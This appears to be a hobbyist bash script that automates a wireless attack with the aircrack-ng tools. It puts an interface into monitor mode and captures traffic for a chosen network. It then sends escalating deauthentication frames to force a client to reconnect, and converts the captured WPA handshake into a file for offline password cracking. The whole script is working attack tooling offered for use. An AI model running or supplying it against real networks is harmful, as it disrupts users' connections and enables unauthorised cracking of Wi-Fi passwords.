#!/bin/bash

deauth_count=0

##functions
deauth_mode () {
echo "Client BSSID: "
read client_variable
aireplay-ng -0 2 -a $bssid_variable -c $client_variable $wanmon
((deauthcount++))
echo $deauthcount
handshake_check
}

deauth_mode2 () {
echo "Client BSSID: "
read client_variable
aireplay-ng -0 6 -a $bssid_variable -c $client_variable $wanmon
((deauthcount++))
echo $deauthcount
handshake_check
}

finished () {
echo "Congratulations! Shutting down"
cap_file=$name_variable
cap_file+="-01.cap"
aircrack-ng -J ./$name_variable/$name_variable ./$name_variable/$cap_file 
}

count_check(){
if ((deauthcount<5)); then
deauth_mode
else
	if ((deauthcount>=5 && deauthcount<10)) 
	then
	deauth_mode2
	else
	if ((deauthcount>=10)); then
	reset_cancel
	fi
fi
fi
}

reset_cancel(){
read -p "Unable to obtain handshake so far. Would you like to keep going? (y/n)" choice
case "$choice" in
	y|Y ) reset_going;;
	n|N ) air_quit;;
	* ) echo "invalid";;
esac
}

air_quit(){
rm -r $name_variable
}

reset_going(){
((deauthcount--))
((deauthcount--))
((deauthcount--))
((deauthcount--))
((deauthcount--))
echo $deauthcount
deauth_mode2
}


handshake_check () {
read -p "Handshake received? (y/n)" choice
case  "$choice" in
	y|Y ) finished;;
	n|N ) count_check;;
	* ) echo "invalid";;
esac
}



## end of cuntions
echo ""
echo "*********************************"
echo "Listing availalbe network devices"
echo "*********************************"
## create funtion to display airmon to array for picking
airmon-ng
echo "Monitoring device: "
read wan_device
wanmon=$wan_device
wanmon+="mon"
airmon-ng start $wan_device
sleep 2
ifconfig $wanmon down
##iwconfig $wan_device mode monitor
ifconfig $wanmon up
airmon-ng
x-terminal-emulator -e airodump-ng $wanmon
sleep 3
##starts monitoring and collecting data for dump
##
##

echo "Please enter BSSID: "
read bssid_variable
echo "You entered $bssid_variable"
echo "Channel: "
read channel_variable
echo "Capture File Name: "
read name_variable
mkdir $name_variable
x-terminal-emulator -e airodump-ng -c $channel_variable --bssid $bssid_variable -w ./$name_variable/$name_variable $wanmon
echo ""
sleep 5

deauth () {
read -p "Send Deauth command? (y/n)" choice
case "$choice" in
	y|Y ) deauth_mode;;
	n|N ) echo air_quit;;
	* ) echo "invalid";;
esac
}

deauth
exit